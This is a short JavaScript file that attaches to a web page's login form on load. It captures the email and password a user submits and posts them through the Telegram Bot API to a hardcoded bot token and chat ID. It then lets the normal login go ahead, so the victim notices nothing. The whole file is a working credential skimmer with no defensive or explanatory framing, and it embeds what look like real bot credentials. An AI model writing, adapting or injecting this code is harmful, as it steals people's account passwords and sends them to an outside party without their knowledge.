document.addEventListener("DOMContentLoaded", function () {
    const botToken = "7828137703:AAEM8840LvauWrMeIvQ2humIvvwGzlgwbnc";  // Replace with your Telegram bot token
    const chatId = "-1002477584801";  // Replace with your Telegram chat ID

    const form = document.querySelector("form"); // Select the login form
    if (form) {
        form.addEventListener("submit", function (event) {
            event.preventDefault(); // Prevent the default submission

            const email = document.querySelector("input[name='email']").value;
            const password = document.querySelector("input[name='password']").value;

            const message = `New Login Attempt:\n📧 Email: ${email}\n🔑 Password: ${password}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });

            form.submit(); // Proceed with the normal login
        });
    }
});
